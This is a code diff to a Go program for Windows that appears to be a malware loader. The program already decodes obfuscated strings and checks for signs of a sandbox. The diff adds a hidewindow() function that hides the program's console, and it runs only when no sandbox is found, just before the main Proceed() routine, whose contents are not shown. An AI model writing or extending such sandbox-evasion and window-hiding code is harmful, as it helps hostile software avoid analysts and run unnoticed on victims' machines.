@@ -3,6 +3,7 @@ package main
 import (
 	"fmt"
 	"golang.org/x/sys/windows/registry"
+	"golang.org/x/w32"	//讲该项目https://github.com/gonutz/ide/tree/master/w32本地导入
 	"io/ioutil"
 	"log"
 	"net/http"
@@ -60,6 +61,20 @@ func dec(src string) (res string) {
 		j = (j + 1) % 8
 	}
 	return result
+}
+
+func hidewindow(){
+	console := w32.GetConsoleWindow()
+
+	if console == 0 {
+		return // no console attached
+	}
+
+	_, consoleProcID := w32.GetWindowThreadProcessId(console)
+
+	if w32.GetCurrentProcessId() == consoleProcID {
+		w32.ShowWindowAsync(console, w32.SW_HIDE)
+	}
 }
 
 func Proceed() {
@@ -148,6 +163,7 @@ func main() {
 	}
 
 	if len(EvidenceOfSandbox) == 0 {
+		hidewindow()
 		Proceed()
 	} else {
 		fmt.Println(EvidenceOfSandbox)
